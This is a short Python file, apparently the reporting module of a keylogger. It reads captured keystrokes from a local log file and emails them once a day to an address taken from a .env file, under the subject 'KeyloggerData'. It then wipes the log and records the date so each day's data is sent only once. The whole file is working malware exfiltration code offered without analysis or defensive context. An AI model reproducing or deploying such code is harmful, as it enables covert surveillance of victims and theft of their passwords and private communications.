import datetime
import email_sender

from dotenv import dotenv_values


def send():
    env_variables = dotenv_values(".env")

    sender_email = env_variables.get('EMAIL')
    receiver_email = env_variables.get('EMAIL')
    password = env_variables.get('PASSWORD')
    subject = 'KeyloggerData'
    body = ''
    
    try:
        with open('log.txt', 'r') as f:
            body += f.read()
    except Exception as e:
        pass


    current_datetime = datetime.datetime.now().today()
    current_date_str = datetime.datetime.strftime(current_datetime, '%Y-%m-%d')

    subject += ' - '+current_date_str

    def send_email_daily():
        email_sender.send_email(sender_email, receiver_email, password, subject, body)
        # print(body)
        with open('log.txt', 'w') as f:
            f.write('')
        with open('datelog.txt', 'a') as f:
            f.write(current_date_str+"\n")

    lines = []
    try:
        with open('datelog.txt', 'r') as f:
            lines = [line.strip() for line in f.readlines()]
    except Exception as e:
        pass
        
    print(lines)
    print()
    print(current_date_str)
    if current_datetime.hour>=12 and current_date_str not in lines:
        send_email_daily()